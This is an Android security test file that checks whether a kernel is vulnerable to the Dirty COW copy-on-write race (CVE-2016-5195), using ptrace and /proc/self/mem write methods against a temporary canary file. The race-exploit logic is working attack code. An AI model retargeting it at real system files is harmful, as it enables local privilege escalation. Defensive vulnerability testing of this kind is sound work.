/*
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * Refers to: CVE-2016-5195 (aka Dirty COW)
 * Fixed by: 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
 */
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "../includes/common.h"

#define CANARY 0x64636f77L

time_t test_started;

struct test_arg;

struct exploit_method {
  const char *name;
  int (*prepare)(struct test_arg *arg);
  void (*exploit)(struct test_arg *arg);
  void (*finalize)(struct test_arg *arg);
};

struct test_arg {
  int success;
  sem_t done;
  void *mapping;
  const char *test_file;
  const struct exploit_method *method;
  pid_t child;
  int fd;
  pthread_t t_madvise;
};

static void *do_madvise(void *arg) {
  struct test_arg *p = arg;

  /*
   * This thread continuously spams the kernel with madvise to
   * drop the private writable copy of the page altered by the
   * exploit loop which was created via the COW mechanism. A
   * vulnerable kernel will soon be tricked into having a write
   * request wrongly affect the read-only source data.
   */
  while(timer_active(test_started)) {
    madvise(p->mapping, sizeof(long), MADV_DONTNEED);
    if (!sem_trywait(&p->done)) {
      break;
    }
  }

  sem_post(&p->done);

  return NULL;
}

static int prep_ptrace_method(struct test_arg *p) {
  int ret, status;
  pid_t pid;

  pid = fork();
  if (pid < 0) {
    perror("fork");
    exit(EXIT_FAILURE);
  }

  if (pid) {
    p->child = pid;
    /* Wait for the child to stop. */
    do {
      ret = waitpid(pid, &status, 0);
    } while (ret != -1 && !WIFSTOPPED(status));
  } else {
    prctl(PR_SET_PDEATHSIG, SIGHUP);
    ret = pthread_create(&p->t_madvise, NULL, do_madvise, p);
    if (ret) {
      perror("pthread_create(madvise)");
      exit(EXIT_FAILURE);
    }
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    raise(SIGSTOP);
    exit(0);
  }

  return 0;
}

static void do_ptrace_method(struct test_arg *p) {
  long bad_canary = ~CANARY;

  if (ptrace(PTRACE_POKEDATA, p->child, p->mapping, bad_canary) == -1) {
    perror("ptrace(PTRACE_POKEDATA)");
    exit(EXIT_FAILURE);
  }
}

static const struct exploit_method ptrace_method = {
    .name = "ptrace",
    .prepare = prep_ptrace_method,
    .exploit = do_ptrace_method,
};

static int prep_selfmem_method(struct test_arg *p) {
  int ret;

  p->fd = open("/proc/self/mem", O_RDWR);
  if (p->fd < 0) {
    return -1;
  }

  ret = pthread_create(&p->t_madvise, NULL, do_madvise, p);
  if (ret) {
    perror("pthread_create(madvise)");
    exit(EXIT_FAILURE);
  }

  return 0;
}

static void do_selfmem_method(struct test_arg *p) {
  long bad_canary = ~CANARY;
  int ret;

  ret = lseek(p->fd, (off_t)p->mapping, SEEK_SET);
  if (ret != (off_t)-1) {
    ret = write(p->fd, &bad_canary, sizeof(bad_canary));
  }
  (void)ret;
}

static void finalize_selfmem_method(struct test_arg *p) {
  sem_post(&p->done);
  pthread_join(p->t_madvise, NULL);
  close(p->fd);
}

static const struct exploit_method selfmem_method = {
    .name = "selfmem",
    .prepare = prep_selfmem_method,
    .exploit = do_selfmem_method,
    .finalize = finalize_selfmem_method,
};

static void *do_observe(void *arg) {
  const struct timespec ts = {
      .tv_sec = 0,
      .tv_nsec = 10000000,
  };
  struct test_arg *p = arg;
  int fd, ret;
  long canary;

  while(timer_active(test_started)) {
    fd = open(p->test_file, O_RDONLY);
    if (fd < 0) {
      perror("open(test_file)");
      exit(EXIT_FAILURE);
    }

    ret = read(fd, &canary, sizeof(canary));
    close(fd);

    if (ret == sizeof(canary) && canary != CANARY) {
      p->success = 1;
      break;
    }
    if (!sem_trywait(&p->done)) {
      break;
    }
    clock_nanosleep(CLOCK_MONOTONIC, 0, &ts, NULL);
  }

  sem_post(&p->done);

  return NULL;
}

static void do_exploit(struct test_arg *p) {
  time_t test_started = start_timer();
  while (timer_active(test_started)) {
    p->method->exploit(p);
    if (!sem_trywait(&p->done)) {
      return;
    }
  }

  sem_post(&p->done);
}

static int do_test(const struct exploit_method *method) {
  char test_file[] = "/data/local/tmp/pocXXXXXX";
  pthread_t t_observer;
  struct test_arg arg;
  long canary;
  int ret, fd;

  printf("trying %s method\n", method->name);

  fd = mkstemp(test_file);
  if (fd < 0) {
    perror("cannot create temp file");
    exit(EXIT_FAILURE);
  }
  canary = CANARY;
  ret = write(fd, &canary, sizeof(canary));
  (void)ret;

  memset(&arg, 0, sizeof(arg));
  arg.mapping = mmap(NULL, sizeof(canary), PROT_READ, MAP_PRIVATE, fd, 0);
  if (arg.mapping == MAP_FAILED) {
    perror("mmap(MAP_PRIVATE)");
    exit(EXIT_FAILURE);
  }
  close(fd);

  sem_init(&arg.done, 0, 0);
  arg.test_file = test_file;
  arg.method = method;

  if (method->prepare(&arg)) {
    goto skip;
  }

  ret = pthread_create(&t_observer, NULL, do_observe, &arg);
  if (ret) {
    perror("pthread_create(observer)");
    exit(EXIT_FAILURE);
  }

  do_exploit(&arg);

  pthread_join(t_observer, NULL);
skip:
  if (method->finalize) {
    method->finalize(&arg);
  }

  sem_destroy(&arg.done);
  unlink(test_file);

  return arg.success;
}

int main() {
  int ret;
  test_started = start_timer();

  /*
   * CVE-2016-5195 refers to the infamous "Dirty COW" attack,
   * exploiting a race window in the copy-on-write
   * implementation to gain local privilege escalation, by
   * overwriting any arbitrary file through a read-only memory
   * mapping.
   *
   * We implement the /proc/self/mem and ptrace() methods to
   * check for the vulnerability.
   */
  ret = do_test(&ptrace_method);
  if (!ret) {
    ret = do_test(&selfmem_method);
  }

  if (ret) {
    return EXIT_VULNERABLE;
  }

  return EXIT_SUCCESS;
}
